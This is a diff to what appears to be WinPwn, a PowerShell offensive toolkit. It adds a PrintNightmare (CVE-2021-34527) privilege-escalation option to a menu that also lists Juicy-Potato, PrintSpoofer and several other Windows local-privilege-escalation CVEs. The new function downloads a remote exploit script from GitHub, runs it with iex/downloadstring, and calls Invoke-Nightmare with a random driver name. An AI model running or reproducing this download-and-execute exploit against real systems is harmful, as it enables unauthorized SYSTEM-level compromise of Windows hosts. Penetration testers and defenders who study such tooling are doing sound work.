@@ -828,10 +828,11 @@ __        ___       ____
 	    Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
 	    Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
         Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - SMBGhost only SMBV3 with compression - no bind shell! '
-	Write-Host -ForegroundColor Green '11. CVE-2020-0787 - March 2020 - all windows versions - BITSArbitraryFileMove ! '
-        Write-Host -ForegroundColor Green '12. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '13. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
-        Write-Host -ForegroundColor Green '14. Exit. '
+	    Write-Host -ForegroundColor Green '11. CVE-2020-0787 - March 2020 - all windows versions - BITSArbitraryFileMove ! '
+        Write-Host -ForegroundColor Green '12. PrintNightmare - CVE-2021-34527 - July 2021 - All Windows versions running the Spooler Service!'
+        Write-Host -ForegroundColor Green '13. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '14. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
+        Write-Host -ForegroundColor Green '15. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -848,11 +849,12 @@ __        ___       ____
 	        9{CVE-2020-0683-lpe}
             10{cve-2020-0796}
             11{cve-2020-0787-lpe}
-	    12{juicypot}
-            13{printspoofer}
+            12{PrintNightmare}
+	        13{juicypot}
+            14{printspoofer}
        }
     }
- While ($masterquestion -ne 14)
+ While ($masterquestion -ne 15)
 
 }
 
@@ -862,6 +864,13 @@ function testtemp
  {
     mkdir C:\temp
  }
+}
+
+function PrintNightmare
+{
+    $DriverName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-PrintNightmare.ps1')
+    Invoke-Nightmare -DriverName $DriverName
 }
 
 function cve-2020-0796
